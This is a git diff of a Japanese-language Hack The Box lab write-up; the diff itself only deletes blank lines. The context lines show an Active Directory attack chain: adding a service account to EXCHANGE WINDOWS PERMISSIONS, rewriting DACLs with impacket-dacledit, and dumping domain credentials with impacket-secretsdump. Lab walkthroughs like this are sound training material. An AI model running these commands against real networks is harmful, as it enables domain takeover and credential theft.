@@ -261,7 +261,6 @@ GenericAllを利用して、svc-alfrescoを「EXCHANGE WINDOWS PERMISSIONS」グ
 ```sh
 └─$ net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172 
                                                                                                                                  
-
 └─$ net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.191.172
 HTB\Exchange Trusted Subsystem
 HTB\svc-alfresco
@@ -275,7 +274,6 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
 [*] DACL backed up to dacledit-20250711-104639.bak
 [*] DACL modified successfully!
-
 
 └─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'svc-alfresco' -target-dn 'CN=DOMAIN ADMINS,CN=USERS,DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice' -dc-ip 10.129.191.172
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -291,7 +289,6 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] DACL backed up to dacledit-20250711-210233.bak
 [*] DACL modified successfully!
-
 
 └─$ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@10.129.191.172
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
